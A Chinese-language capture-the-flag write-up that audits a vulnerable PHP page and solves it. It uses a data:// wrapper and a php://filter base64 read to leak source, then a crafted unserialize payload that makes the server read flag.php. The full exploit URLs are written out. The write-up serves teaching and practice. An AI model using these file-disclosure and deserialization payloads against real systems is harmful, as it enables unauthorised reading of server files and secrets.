# [ZJCTF 2019]NiZhuanSiWei 1

- 进入网页，开始代码审计

```php
 <?php  
//构建参数text file password
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
//text内容必须为welcome to the zjctf
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    //file中不能存在flag
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        //文件包含file
        include($file);  //useless.php
        //对password进行反序列化
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
```

- 从代码审计的结果来看，这道题有三层，第一层是构建text，绕过 `file_get_contents()` 函数，第二层是构建flag，获取 `useless.php` 中的内容，第三层则是通过 `useless.php` 中的提示来构建password得到flag

- 首先考虑第一层，这道题使用GET传参，则可以使用 `data://` 伪协议，尝试成功

`?text=data://text/plain,welcome to the zjctf`

> <img src="../../IMG2/Screenshot 2024-06-02 200822.png">

- 第二层是获取 `useless.php` 中的内容，直接输入 `useless.php` 没有任何反应，使用 `php://filter/` 伪协议尝试成功

`?text=data://text/plain,welcome to the zjctf&file=php://filter/convert.base64-encode/resource=useless.php`

> <img src="../../IMG2/Screenshot 2024-06-02 203649.png">

- 使用base64解码，得到一串代码，开始代码审计

```php
<?php  
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

- 根据代码审计结果，我们需要构建类Flag，Flag里需要存在一个属性$file，$file会经历一次 `file_get_contents()` 函数，代码也提示了存在flag.php，因此payload如下

```php
class Flag{
    public $file = 'flag.php';
}
$pass = new Flag();
echo serialize($pass);
```

- 输入结果为 `O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}` ，将结果作为参数password的值，最终payload如下，在源代码中发现flag

`http://9b8ce083-989a-4e81-911c-31e651b04448.node5.buuoj.cn:81/index.php?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}`

> <img src="../../IMG2/Screenshot 2024-06-02 204647.png">